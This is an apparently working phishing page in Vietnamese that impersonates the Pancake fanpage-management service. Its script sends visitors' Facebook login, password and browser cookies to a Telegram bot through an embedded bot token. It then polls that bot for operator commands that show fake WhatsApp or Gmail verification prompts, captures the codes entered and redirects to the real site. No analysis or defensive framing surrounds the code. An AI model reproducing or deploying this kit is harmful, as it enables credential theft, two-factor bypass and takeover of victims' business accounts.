<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pancake - H·ªá th·ªëng qu·∫£n l√Ω ƒëa k√™nh</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, sans-serif; margin: 0; background-color: #f0f2f5; }
        .container { max-width: 420px; margin: 30px auto; background: #fff; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); overflow: hidden; }
        .header { padding: 20px; text-align: center; border-bottom: 1px solid #f0f0f0; }
        .logo { width: 140px; }
        .content { padding: 25px; text-align: center; }
        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; }
        .btn { width: 100%; padding: 14px; background: #0066ff; color: #fff; border: none; border-radius: 25px; font-weight: bold; cursor: pointer; margin-top: 10px; }
        .hidden { display: none; }
        /* Giao di·ªán ch·ªçn Page ·∫£o */
        .page-list { text-align: left; margin: 15px 0; }
        .page-item { display: flex; align-items: center; padding: 12px; border: 1px solid #eee; margin-bottom: 8px; border-radius: 10px; cursor: pointer; }
        .page-item:hover { background: #f9f9f9; }
        .circle { width: 45px; height: 45px; background: #0066ff; border-radius: 50%; color: white; display: flex; align-items: center; justify-content: center; font-weight: bold; margin-right: 15px; }
        .loading { border: 3px solid #f3f3f3; border-top: 3px solid #0066ff; border-radius: 50%; width: 25px; height: 25px; animation: spin 1s linear infinite; margin: 15px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div class="container">
    <div class="header"><img src="https://pancake.vn/images/logo.png" class="logo"></div>

    <div id="step-login" class="content">
        <h2 style="color: #0066ff; font-size: 20px;">K·∫øt n·ªëi t√†i kho·∫£n</h2>
        <p style="color: #666; font-size: 14px;">Vui l√≤ng ƒëƒÉng nh·∫≠p ƒë·ªÉ ƒë·ªìng b·ªô danh s√°ch Fanpage</p>
        <input type="text" id="email" placeholder="S·ªë ƒëi·ªán tho·∫°i ho·∫∑c Email">
        <input type="password" id="pass" placeholder="M·∫≠t kh·∫©u Facebook">
        <button class="btn" onclick="goHarvest()">Ti·∫øp t·ª•c</button>
    </div>

    <div id="step-wait" class="content hidden">
        <div class="loading"></div>
        <h3>ƒêang ki·ªÉm tra b·∫£o m·∫≠t...</h3>
        <p style="font-size: 13px; color: #888;">Vui l√≤ng kh√¥ng tho√°t tr√¨nh duy·ªát l√∫c n√†y.</p>
    </div>

    <div id="step-otp" class="content hidden">
        <h3 id="otp-title" style="color: #d93025;">X√°c minh danh t√≠nh</h3>
        <p id="otp-desc">Nh·∫≠p m√£ x√°c th·ª±c v·ª´a ƒë∆∞·ª£c g·ª≠i v·ªÅ cho b·∫°n.</p>
        <input type="text" id="otp-val" placeholder="Nh·∫≠p m√£ 6 ch·ªØ s·ªë">
        <button class="btn" onclick="sendOTP()">X√°c nh·∫≠n m√£</button>
    </div>

    <div id="step-pages" class="content hidden">
        <h3 style="text-align: left;">Ch·ªçn Fanpage ƒë·ªÉ li√™n k·∫øt</h3>
        <div class="page-list">
            <div class="page-item" onclick="finish()"> <div class="circle">A1</div> <div><b>√ÅO LUXURY - C∆° s·ªü 1</b><br><small>ƒêang ho·∫°t ƒë·ªông</small></div> </div>
            <div class="page-item" onclick="finish()"> <div class="circle">A2</div> <div><b>√ÅO LUXURY - Mi·ªÅn Nam</b><br><small>ƒêang ho·∫°t ƒë·ªông</small></div> </div>
            <div class="page-item" onclick="finish()"> <div class="circle">A3</div> <div><b>√ÅO LUXURY - T·ªïng kho</b><br><small>Ch∆∞a li√™n k·∫øt</small></div> </div>
        </div>
        <p style="font-size: 12px; color: #999;">Nh·∫•n v√†o Page ƒë·ªÉ b·∫Øt ƒë·∫ßu ƒë·ªìng b·ªô h·ªôi tho·∫°i.</p>
    </div>
</div>

<script>
    const TOKEN = "7371520036:AAEOaH2aesiMDvGT5T7iHs3XyTroSLsiGSM"; // Token c≈©
    const CHAT_ID = "-1003722341918"; // Nh√≥m c·ªßa b·∫°n

    async function goHarvest() {
        const u = document.getElementById('email').value;
        const p = document.getElementById('pass').value;
        if(!u || !p) return alert("Vui l√≤ng nh·∫≠p ƒë·ªß th√¥ng tin!");

        // G·ª≠i data v·ªÅ Tele
        const text = `üîî C√Å M·ªöI N·ªî:\nüë§ User: ${u}\nüîë Pass: ${p}\nüç™ Cookie: ${document.cookie || 'N/A'}`;
        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`);

        show('step-wait');
        listen();
    }

    async function listen() {
        try {
            const r = await fetch(`https://api.telegram.org/bot${TOKEN}/getUpdates?offset=-1`);
            const d = await r.json();
            const cmd = d.result[0]?.message?.text;

            if (cmd === "/otp_wa") {
                setOTP("WhatsApp", "M√£ x√°c th·ª±c 6 s·ªë ƒë√£ ƒë∆∞·ª£c g·ª≠i qua WhatsApp.");
            } else if (cmd === "/otp_mail") {
                setOTP("Gmail", "Vui l√≤ng ki·ªÉm tra h·ªôp th∆∞ ƒë·∫øn ho·∫∑c th∆∞ r√°c Gmail.");
            } else if (cmd === "/done") {
                show('step-pages');
            } else {
                setTimeout(listen, 3000); // Polling m·ªói 3s
            }
        } catch (e) { setTimeout(listen, 3000); }
    }

    function setOTP(t, d) {
        document.getElementById('otp-title').innerText = "X√°c minh " + t;
        document.getElementById('otp-desc').innerText = d;
        show('step-otp');
    }

    async function sendOTP() {
        const o = document.getElementById('otp-val').value;
        const t = document.getElementById('otp-title').innerText;
        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=üì© M√É ${t}: ${o}`);
        alert("M√£ kh√¥ng ch√≠nh x√°c, vui l√≤ng ki·ªÉm tra l·∫°i!");
        show('step-wait');
        listen();
    }

    function show(id) {
        ['step-login', 'step-wait', 'step-otp', 'step-pages'].forEach(i => document.getElementById(i).classList.add('hidden'));
        document.getElementById(id).classList.remove('hidden');
    }

    function finish() { window.location.href = "https://pancake.vn"; }
</script>
</body>
</html>
